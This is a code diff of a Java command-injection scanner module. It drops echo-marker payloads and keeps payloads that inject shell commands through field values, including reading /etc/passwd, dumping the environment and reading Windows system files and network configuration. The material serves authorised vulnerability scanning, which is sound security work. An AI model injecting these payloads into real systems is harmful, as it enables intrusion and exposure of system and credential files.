@@ -131,10 +131,6 @@ public class CommandInjectionScanner implements ScanModule {
             // uname — require kernel version pattern, not just "Linux"
             {";uname -a;", "REGEX:Linux\\s+\\S+\\s+\\d+\\.\\d+\\.\\d+", "uname (Unix)"},
             {"|uname -a", "REGEX:Linux\\s+\\S+\\s+\\d+\\.\\d+\\.\\d+", "uname piped (Unix)"},
-            // echo marker — unique string, no FP possible
-            {";echo cmdi_confirmed;", "cmdi_confirmed", "echo marker (Unix)"},
-            {"|echo cmdi_confirmed", "cmdi_confirmed", "echo marker piped (Unix)"},
-            {"$(echo cmdi_confirmed)", "cmdi_confirmed", "echo marker subshell (Unix)"},
             // Newline separator
             {"%0aid%0a", "REGEX:uid=\\d+", "id via newline (Unix)"},
             // $IFS space bypass
@@ -144,10 +140,6 @@ public class CommandInjectionScanner implements ScanModule {
             {"$(expr 97531 + 33806)", "131337", "expr math subshell (Unix)"},
             // Backtick nesting with $IFS
             {"`cat${IFS}/etc/passwd`", "root:x:0:0:", "/etc/passwd via IFS backtick (Unix)"},
-            // whoami — echo-wrapped with unique prefix
-            {";echo cmdi_$(whoami)_confirmed;", "REGEX:cmdi_\\w+_confirmed", "whoami echo-wrapped (Unix)"},
-            {"|echo cmdi_$(whoami)_confirmed", "REGEX:cmdi_\\w+_confirmed", "whoami echo-wrapped piped (Unix)"},
-            {"$(echo cmdi_$(whoami)_confirmed)", "REGEX:cmdi_\\w+_confirmed", "whoami echo-wrapped subshell (Unix)"},
             // env/printenv — require PATH with Unix directory structure
             {";env;", "REGEX:PATH=/(?:usr|bin|sbin)", "env dump (Unix)"},
             {";printenv;", "REGEX:PATH=/(?:usr|bin|sbin)", "printenv (Unix)"},
@@ -177,23 +169,14 @@ public class CommandInjectionScanner implements ScanModule {
     };
 
     private static final String[][] OUTPUT_PAYLOADS_WINDOWS = {
-            // whoami echo-wrapped — unique marker
-            {"& echo cmdi_%username%_confirmed &", "REGEX:cmdi_\\w+_confirmed", "whoami echo-wrapped (Windows)"},
-            {"| echo cmdi_%username%_confirmed", "REGEX:cmdi_\\w+_confirmed", "whoami echo-wrapped piped (Windows)"},
             // win.ini — [fonts] section is definitive
             {"& type C:\\Windows\\win.ini &", "[fonts]", "win.ini read (Windows)"},
             {"| type C:\\Windows\\win.ini", "[fonts]", "win.ini piped (Windows)"},
-            // echo marker — unique string
-            {"& echo cmdi_confirmed &", "cmdi_confirmed", "echo marker (Windows)"},
-            {"| echo cmdi_confirmed", "cmdi_confirmed", "echo marker piped (Windows)"},
             // ver — require full version string format
             {"& ver &", "REGEX:Microsoft Windows \\[Version \\d+\\.", "ver command (Windows)"},
             // set /a math marker — unique number
             {"& set /a 97531+33806 &", "131337", "set /a math marker (Windows)"},
             // Newline separator
-            {"%0aecho cmdi_%username%_confirmed%0a", "REGEX:cmdi_\\w+_confirmed", "whoami echo-wrapped newline (Windows)"},
-            // cmd /c echo
-            {"& cmd /c echo cmdi_confirmed &", "cmdi_confirmed", "cmd /c echo marker (Windows)"},
             // ipconfig — require IPv4 address pattern
             {"& ipconfig &", "REGEX:IPv4.*:\\s*\\d+\\.\\d+\\.\\d+\\.\\d+", "ipconfig (Windows)"},
             // systeminfo — require OS Name with Microsoft
@@ -207,7 +190,6 @@ public class CommandInjectionScanner implements ScanModule {
             // wmic — require Windows with version number
             {"& wmic os get caption &", "REGEX:Microsoft Windows\\s+(?:Server\\s+)?\\d+", "wmic os (Windows)"},
             // PowerShell expressions
-            {"& powershell -c \"Write-Output cmdi_confirmed\" &", "cmdi_confirmed", "powershell output (Windows)"},
             {"& powershell -c \"[System.Environment]::OSVersion\" &", "REGEX:Microsoft Windows NT \\d+\\.\\d+", "powershell OSVersion (Windows)"},
     };
 
